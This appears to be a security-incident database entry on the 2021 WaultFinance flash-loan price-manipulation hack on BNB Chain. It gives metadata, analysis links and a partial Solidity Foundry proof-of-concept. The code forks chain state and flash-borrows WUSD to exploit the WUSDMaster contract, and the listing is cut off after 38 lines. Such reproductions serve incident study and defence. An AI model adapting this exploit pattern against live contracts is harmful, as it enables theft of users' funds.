# [?] WaultFinace - FlashLoan price manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: WaultFinance
Published: 2021-08-04
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-08/WaultFinance_exp.sol
Type: defi-exploit-poc

## Details
References:
- https://medium.com/@Knownsec_Blockchain_Lab/wault-finance-flash-loan-security-incident-analysis-368a2e1ebb5b
- https://inspexco.medium.com/wault-finance-incident-analysis-wex-price-manipulation-using-wusdmaster-contract-c344be3ed376
- https://bscscan.com/tx/0x31262f15a5b82999bf8d9d0f7e58dcb1656108e6031a2797b612216a95e1670e

```solidity
contract ContractTest is Test {
    IERC20 WUSD = IERC20(0x3fF997eAeA488A082fb7Efc8e6B9951990D0c3aB);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WEX = IERC20(0xa9c41A46a6B3531d28d5c32F6633dd2fF05dFB90);
    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0x6102D8A7C963F78D46a35a6218B0DB4845d1612F); // WUSD BUSD
    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // WBNB USDT
    Uni_Router_V2 Router = Uni_Router_V2(0xD48745E39BbED146eEC15b79cBF964884F9877c2); // WS router
    WUSDMASTER Master = WUSDMASTER(0xa79Fe386B88FBee6e492EEb76Ec48517d1eC759a);
    uint256 Pair1Amount;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 9_728_755);
    }

    function testExploit() public {
        // borrow WUSD
        Pair1Amount = WUSD.balanceOf(address(Pair1)) - 1;
        Pair1.swap(Pair1Amount, 0, address(this), new bytes(1));

        // WUSD to BUSD
        WUSD.approve(address(Router), type(uint256).max);
        WUSDToBUSD();

        emit log_named_decimal_uint("Attacker BUSD profit after exploit", BUSD.balanceOf(address(this)), 18);
    }

    function waultSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        WUSD.approve(address(Master), type(uint256).max);
        // WUSD to USDT, WEX
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-08/WaultFinance_exp.sol_
